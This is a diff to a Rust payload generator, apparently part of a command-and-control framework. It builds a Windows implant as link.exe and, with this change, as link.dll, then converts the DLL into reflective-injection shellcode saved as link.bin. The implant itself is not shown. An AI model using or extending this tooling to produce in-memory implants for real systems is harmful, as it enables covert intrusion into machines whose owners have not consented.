@@ -1,5 +1,9 @@
 use std::fs;
 use std::io::prelude::*;
+use util::shellcode;
+
+// internal packages
+use crate::util;
 
 fn generate_help() {
     println!("generate <ip:port>");
@@ -131,8 +135,13 @@ pub fn generate(args: Vec<String>) {
         "{}/.link/link/target/x86_64-pc-windows-gnu/release/link.exe",
         home_dir
     );
+    let link_dll_path = &format!(
+        "{}/.link/link/target/x86_64-pc-windows-gnu/release/link.dll",
+        home_dir
+    );
     let link_dir_src_path = format!("{}/src", link_dir_path);
     let dest_link_path = format!("{}/link.exe", prev_dir_path.clone().display());
+    let dest_link_dll_path = format!("{}/link.dll", prev_dir_path.clone().display());
     // check for first build
     if fs::metadata(link_dir_path).is_err() {
         println!("first link build will take time");
@@ -174,8 +183,6 @@ pub fn generate(args: Vec<String>) {
     output_file
         .write_all(build.as_bytes())
         .expect("could not write contents to output file");
-    // TODO
-    // run cargo fetch --release, then build with --offline for efficiency
     // create link executable
     println!("please wait...");
     let output = std::process::Command::new("cargo")
@@ -191,10 +198,23 @@ pub fn generate(args: Vec<String>) {
         println!("could not change back to previous directory");
         return;
     }
-    // copy file to current dir
-    let link_copy = fs::copy(link_exec_path, dest_link_path);
+    // copy files to current dir
+    let mut link_copy = fs::copy(link_exec_path, dest_link_path);
     match link_copy {
         Err(e) => println!("{}", e),
         Ok(_) => println!("output: link.exe"),
     }
+    link_copy = fs::copy(link_dll_path, dest_link_dll_path);
+    match link_copy {
+        Err(e) => println!("{}", e),
+        Ok(_) => println!("output: link.dll"),
+    }
+    // create shellcode and output to file
+    let link_shellcode = shellcode::shellcode_rdi("link.dll", "main", "".to_string());
+    output_file = fs::File::create("link.bin").expect("could not write file");
+    output_file
+        .write_all(&link_shellcode)
+        .expect("could not write contents to output file");
+    println!("shellcode created");
+    println!("output: link.bin");
 }
